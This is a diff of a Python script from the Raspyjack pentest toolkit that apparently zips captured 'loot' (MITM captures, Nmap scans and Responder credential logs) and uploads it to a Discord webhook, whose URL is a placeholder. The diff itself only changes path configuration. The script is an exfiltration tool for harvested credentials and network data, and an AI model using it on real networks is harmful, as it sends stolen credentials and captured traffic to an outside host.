@@ -30,11 +30,6 @@ Discord limits a single upload to **≤ 8 MiB** for standard (non Nitro) accou
 import os, sys, io, zipfile, datetime, signal, textwrap
 from pathlib import Path          # path handling in an OS‑agnostic way
 
-# Prefer /root/Raspyjack for imports; fallback to repo-relative
-RASPYJACK_ROOT = '/root/Raspyjack' if os.path.isdir('/root/Raspyjack') else os.path.abspath(os.path.join(__file__, '..', '..'))
-if RASPYJACK_ROOT not in sys.path:
-    sys.path.insert(0, RASPYJACK_ROOT)
-
 # ---------------------------------------------------------------------------
 # 1) Third‑party dependency – `requests`
 # ---------------------------------------------------------------------------
@@ -48,11 +43,11 @@ except ModuleNotFoundError as exc:
 # ---------------------------------------------------------------------------
 # 2) Configuration – tweak these paths if your layout differs
 # ---------------------------------------------------------------------------
-# Roots prefer /root/Raspyjack when available
-LOOT_DIR       = Path(RASPYJACK_ROOT) / "loot"
+# (Paths are **relative** to the folder where you launch the script.)
+LOOT_DIR       = Path("loot")
 MITM_DIR       = LOOT_DIR / "MITM"
 NMAP_DIR       = LOOT_DIR / "Nmap"
-RESPONDER_DIR  = Path(RASPYJACK_ROOT) / "Responder" / "logs"
+RESPONDER_DIR  = Path("Responder") / "logs"
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxx/YYYYYYYYYYYYY" #<- EDIT ME!
 
